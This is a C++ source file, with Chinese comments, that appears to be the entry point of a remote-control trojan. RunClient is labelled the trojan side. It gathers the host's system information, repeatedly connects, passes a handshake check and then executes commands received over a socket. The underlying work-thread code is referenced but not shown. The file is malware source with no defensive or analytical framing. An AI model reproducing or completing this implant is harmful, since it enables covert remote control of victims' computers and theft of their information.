// Server.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "Server.h"
#include "WorkThreadMain.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 唯一的应用程序对象

CWinApp theApp;

using namespace std;

//运行客户端（马端）
void RunClient()
{
	CWorkThreadMain workThread;
	workThread.m_bRunFlag = true;
	workThread.GetSysInfo();   //获取电脑的信息

	SOCKET socket;
	while (true)
	{
		if (!workThread.m_bRunFlag)
		{
			break;
		}
		socket = workThread.Run();
		workThread.ShakeHandCheck(socket, &workThread.m_bRunFlag);
		if (workThread.m_bRunFlag)  //验证成功
		{
			workThread.ExecCommand(socket);  //执行命令
		}
	}
	::closesocket(socket);
	WSACleanup();
}

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))  //加上这句话，就能显示出MFC的对话框资源了
	{
		// TODO: 更改错误代码以符合您的需要
		_tprintf(_T("错误: MFC 初始化失败\n"));
	}
	RunClient();
	return 0;
}
